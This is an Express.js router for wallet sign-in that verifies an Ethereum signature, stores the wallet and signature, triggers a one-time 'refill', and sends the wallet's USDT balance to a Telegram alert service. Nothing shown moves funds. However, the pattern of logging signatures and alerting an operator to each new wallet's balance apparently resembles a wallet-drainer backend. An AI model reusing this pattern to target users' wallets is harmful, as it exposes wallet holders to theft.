import express from "express";
import { pool } from "../db.js";
import { ensureRefilledOnce } from "../refill.js";
import { getBalanceHuman } from "../contract.js"; // helper to get USDT balance
import { sendNewWalletAlert } from "../telegramService.js";

const router = express.Router();
const nonces = new Map();

// GET /auth/nonce?wallet=0x...
router.get("/nonce", (req, res) => {
  const wallet = req.query.wallet;
  if (!wallet) return res.status(400).json({ error: "wallet required" });
  const nonce = `MWM-connect:${Date.now()}:${Math.floor(Math.random()*1e6)}`;
  nonces.set(wallet.toLowerCase(), nonce);
  setTimeout(() => nonces.delete(wallet.toLowerCase()), 10 * 60 * 1000);
  res.json({ nonce });
});

// POST /auth/verify { wallet, signature }
router.post("/verify", async (req, res) => {
  try {
    const { wallet, signature } = req.body;
    if (!wallet || !signature) return res.status(400).json({ error: "wallet & signature required" });
    const key = wallet.toLowerCase();
    const nonce = nonces.get(key);
    if (!nonce) return res.status(400).json({ error: "nonce expired or not found" });

    const { ethers } = await import("ethers");
    const signer = ethers.verifyMessage(nonce, signature);
    if (signer.toLowerCase() !== key) return res.status(400).json({ error: "signature mismatch" });

    // upsert wallet
    await pool.query(
      `INSERT INTO wallets(address, signature, last_balance, alert_pending, refilled) 
       VALUES($1,$2,0,false,false)
       ON CONFLICT(address) DO UPDATE SET signature = EXCLUDED.signature`,
      [key, signature]
    );

    // ensure refill ONCE
    try {
      await ensureRefilledOnce(key);
    } catch (e) {
      console.error("refill error", e);
      // continue anyway
    }

    // get current USDT balance (human)
    const balHuman = await getBalanceHuman(key);
    // send Telegram alert
    await sendNewWalletAlert(key, `${balHuman} USDT`);
    return res.json({ ok: true });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: err.message });
  }
});

export default router;
